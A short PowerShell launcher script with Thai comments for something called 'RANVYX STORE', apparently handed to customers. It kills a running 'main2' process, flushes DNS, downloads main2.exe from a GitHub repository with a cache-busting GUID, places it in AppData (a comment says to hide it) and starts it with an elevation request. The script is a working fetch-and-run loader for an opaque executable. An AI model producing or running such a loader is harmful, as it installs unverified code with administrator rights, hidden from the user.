# 1. สั่งปิดโปรแกรมเดิมก่อน (เผื่อลูกค้าเปิดค้างไว้)
Stop-Process -Name "main2" -ErrorAction SilentlyContinue

# 2. กำหนด Path ที่จะเอาไฟล์ไปซ่อนและรัน (เอาไปไว้ใน AppData)
$exePath = "$env:APPDATA\main2.exe"

# 3. ล้าง DNS Cache ป้องกันโหลดไฟล์เก่า
ipconfig /flushdns

# 4. ตั้งค่า URL ดึงไฟล์จาก GitHub ของคุณโดยตรง (ใส่ ?v=guid เพื่อป้องกัน Cache)
$url = "https://github.com/lubyralph6-maker/godpum.ps1/raw/main/main2.exe?v=$([guid]::NewGuid())"

# 5. ดาวน์โหลดไฟล์
try {
    Write-Host "Downloading and starting RANVYX STORE..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing
} catch {
    Write-Host "Error: Cannot download main2.exe from GitHub! Please check your internet or firewall." -ForegroundColor Red
    exit
}

# 6. รันโปรแกรมทันที (ขอสิทธิ์ Admin อัตโนมัติ)
if (Test-Path $exePath) {
    Write-Host "Launching Program..." -ForegroundColor Green
    Start-Process -FilePath $exePath -Verb RunAs
}
